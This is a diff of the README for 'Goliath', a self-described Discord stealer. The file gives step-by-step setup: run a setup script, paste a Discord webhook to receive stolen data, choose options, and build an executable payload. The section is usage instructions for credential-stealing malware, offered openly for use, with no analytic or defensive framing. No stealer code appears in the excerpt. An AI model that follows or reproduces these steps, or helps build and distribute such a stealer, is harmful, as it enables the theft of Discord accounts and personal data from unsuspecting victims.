@@ -4,26 +4,33 @@ This is the best discord stealer ever made
 📁 〢 Setting Up
 
 1. Download Python:
+
 Make sure you have Python 3.11+ installed and it is added to your path.
 
 3. Download The Files:
+   
 Once you've downloaded the files extract the folder so it's no longer a .zip file.
 
-5. Open The setup.bat File:
+5. Open The goliath-stealer-setup.py File:
+
 You dont need to manually install any modules. Just opening goliath-stealer-setup.py will install them for you. If successfull the goliath-stealer-setup.py will then open up the stealer gui.
 
 7. Create A Webhook:
+
 If you don't know how to make a webhook you can follow this guide: https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks
 Once created, paste the webhook into the webhook prompt.
 
 9. Configurable Options:
+    
 Now once you've done that you can tick the options that you want enabled and anything you don't understand you can go 
 to the documentation where each option is explained.
 
 11. Build The File
+    
 To finally create the file you must enter a filename and press build. Once fully built the build button will say 'Built File'.
 
 13. What Now?
+    
 The file you built will now appear in the current folder with the name you set.
 
 ⚔Features
